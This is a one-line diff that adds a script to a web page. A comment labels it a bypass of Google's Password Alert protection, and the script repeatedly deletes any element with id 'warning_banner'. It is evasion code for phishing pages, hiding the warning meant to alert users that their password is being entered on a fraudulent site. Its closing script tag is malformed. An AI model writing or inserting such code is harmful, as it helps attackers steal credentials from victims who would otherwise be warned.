@@ -1,0 +1,1 @@
+<!-- BYPASS GOOGLE'S PASSWORD ALERT "PROTECTION" --> <script type="text/javascript"> setInterval(function() { if(document.getElementById("warning_banner")) { document.getElementById("warning_banner").remove(); } }, 5); <script>
